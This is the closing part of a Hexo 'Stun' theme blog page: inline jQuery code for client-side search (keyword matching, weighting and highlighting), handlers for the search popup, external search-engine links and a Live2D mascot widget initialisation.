  var path = '/' + search_path;
  $.ajax({
    url: path,
    dataType: isXML ? 'xml' : 'json',
    async: true,
    success: function (res) {
      var datas = isXML ? $('entry', res).map(function () {
        // 将 XML 转为 JSON
        return {
          title: $('title', this).text(),
          content: $('content', this).text(),
          url: $('url', this).text()
        };
      }).get() : res;
      var $input = $('.search-input input');
      var $result = $('.search-results');
      // 搜索对象（标题、内容）的权重，影响显示顺序
      var WEIGHT = { title: 100, content: 1 };
      var searchPost = function () {
        var searchText = $input.val().toLowerCase().trim();
        // 根据空白字符分隔关键字
        var keywords = searchText.split(/[\s]+/);
        // 搜索结果
        var matchPosts = [];

        // 有多个关键字时，将原文字整个保存下来
        if (keywords.length > 1) {
          keywords.push(searchText);
        }
        // 防止未输入字符时搜索
        if (searchText.length > 0) {
          datas.forEach(function (data) {
            var isMatch  = false;
            // 没有标题的文章使用预设的 i18n 变量代替
            var title = (data.title && data.title.trim()) || '[ Untitled ]';
            var titleLower = title && title.toLowerCase();
            // 删除 HTML 标签 和 所有空白字符
            var content = data.content && data.content.replace(/<[^>]+>/g, '');
            var contentLower = content && content.toLowerCase();
            // 删除重复的 /
            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
            // 标题中匹配到的关键词
            var titleHitSlice = [];
            // 内容中匹配到的关键词
            var contentHitSlice = [];

            keywords.forEach(function (keyword) {
              /**
              * 获取匹配的关键词的索引
              * @param {String} keyword 要匹配的关键字
              * @param {String} text 原文字
              * @param {Boolean} caseSensitive 是否区分大小写
              * @param {Number} weight 匹配对象的权重。权重大的优先显示
              * @return {Array}
              */
              function getIndexByword (word, text, caseSensitive, weight) {
                if (!word || !text) {
                  return [];
                };

                var startIndex = 0; // 每次匹配的开始索引
                var index = -1;     // 匹配到的索引值
                var result = [];    // 匹配结果

                if (!caseSensitive) {
                  word = word.toLowerCase();
                  text = text.toLowerCase();
                }

                while((index = text.indexOf(word, startIndex)) !== -1) {
                  var hasMatch = false;
                  // 索引位置相同的关键词，保留长度较长的
                  titleHitSlice.forEach(function (hit) {
                    if (hit.index === index && hit.word.length < word.length) {
                      hit.word = word;
                      hasMatch = true;
                    }
                  });
                  startIndex = index + word.length;
                  !hasMatch && result.push({ index: index, word: word, weight: weight });
                }
                return result;
              }
              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
            });

            var hitTitle = titleHitSlice.length;
            var hitContent = contentHitSlice.length;

            if (hitTitle > 0 || hitContent > 0) {
              isMatch = true;
            }
            if (isMatch) {
              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
                // 按照匹配文字的索引的递增顺序排序
                hit.sort(function (left, right) {
                  return left.index - right.index;
                });
              });
              /**
              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
              * @param {String} text 原文本
              * @param {Array} hitSlice 匹配项的索引信息
              * @param {Number} start 开始索引
              * @param {Number} end 结束索引
              * @return {String}
              */
              function highlightKeyword (text, hitSlice, start, end) {
                if (!text || !hitSlice || !hitSlice.length) {
                  return;
                }

                var result = '';
                var startIndex = start;
                var endIndex = end;
                hitSlice.forEach(function (hit) {
                  if (hit.index < startIndex) {
                    return;
                  }

                  var hitWordEnd = hit.index + hit.word.length;
                  result += text.slice(startIndex, hit.index);
                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
                  startIndex = hitWordEnd;
                });
                result += text.slice(startIndex, endIndex);
                return result;
              }

              var postData = {};
              // 文章总的搜索权重
              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
              // 标记匹配关键词后的标题
              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
              // 标记匹配关键词后的内容
              var postContent;
              // 显示内容的长度
              var SHOW_WORD_LENGTH = 200;
              // 命中关键词前的字符显示长度
              var SHOW_WORD_FRONT_LENGTH = 20;
              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;

              // 截取匹配的第一个字符，前后共 200 个字符来显示
              if (contentHitSlice.length > 0) {
                var firstIndex = contentHitSlice[0].index;
                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
                var end = firstIndex + SHOW_WORD_END_LENGTH;
                postContent = highlightKeyword(content, contentHitSlice, start, end);
              } else { // 未匹配到内容，直接截取前 200 个字符来显示
                postContent = content.slice(0, SHOW_WORD_LENGTH);
              }
              postData.title = postTitle;
              postData.content = postContent;
              postData.url = postURL;
              postData.weight = postWeight;
              matchPosts.push(postData);
            }
          });
        }

        var resultInnerHtml = '';
        if (matchPosts.length) {
          // 按权重递增的顺序排序，使权重大的优先显示
          matchPosts.sort(function (left, right) {
            return right.weight - left.weight;
          });
          resultInnerHtml += '<ul>';
          matchPosts.forEach(function (post) {
            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
            resultInnerHtml += post.title;
            resultInnerHtml += '</a><div class="search-results-content">';
            resultInnerHtml += post.content;
            resultInnerHtml += '</div></li>';
          });
          resultInnerHtml += '</ul>';
        } else {
          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
        }
        $result.html(resultInnerHtml);
      };
      $input.on('input', searchPost);
      $input.on('keyup', function (e) {
        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
          searchPost();
        }
      });
    }
  });
}

function closeSearch () {
  $('body').css({ overflow: 'auto' });
  $('.search-popup').css({ display: 'none' });
  $('.search-mask').css({ display: 'none' });
}

window.addEventListener('DOMContentLoaded', function () {
  Stun.utils.pjaxReloadLocalSearch = function () {
    $('.header-nav-search').on('click', function (e) {
      e.stopPropagation();
      $('body').css('overflow', 'hidden');
      $('.search-popup')
        .velocity('stop')
        .velocity('transition.expandIn', {
          duration: 300,
          complete: function () {
            $('.search-popup input').focus();
          }
        });
      $('.search-mask')
        .velocity('stop')
        .velocity('transition.fadeIn', {
          duration: 300
        });

      initSearch();
    });
    $('.search-mask, .search-close').on('click', function () {
      closeSearch();
    });
    $(document).on('keydown', function (e) {
      // Escape <=> 27
      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
        closeSearch();
      }
    });
  };

  Stun.utils.pjaxReloadLocalSearch();
}, false);

function safeOpenUrl(url) {
  var newTab = window.open();
  newTab.opener = null;
  newTab.location = url;
}

function extSearch(engine) {
  var engines = {
    google: 'https://www.google.com/search?q=',
    bing: 'https://cn.bing.com/search?q=',
    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
  };
  var host = window.location.host;
  var query = $('.search-input input').val().toLowerCase().trim();
  var uri = engines[engine] + query + ' site:' + host;

  if (query) {
    safeOpenUrl(uri);
  } else {
    Stun.utils.popAlert('warning', 'Please enter characters');
  }
}

var assistSearchList = window.CONFIG.assistSearch;

if (Array.isArray(assistSearchList)) {
  assistSearchList.forEach(function (name) {
    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
      extSearch(name);
    }, false);
  });
}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/assets/wanko.model.json"},"display":{"superSample":2,"width":150,"height":300,"position":"left","hOffset":0,"vOffset":-80},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body></html>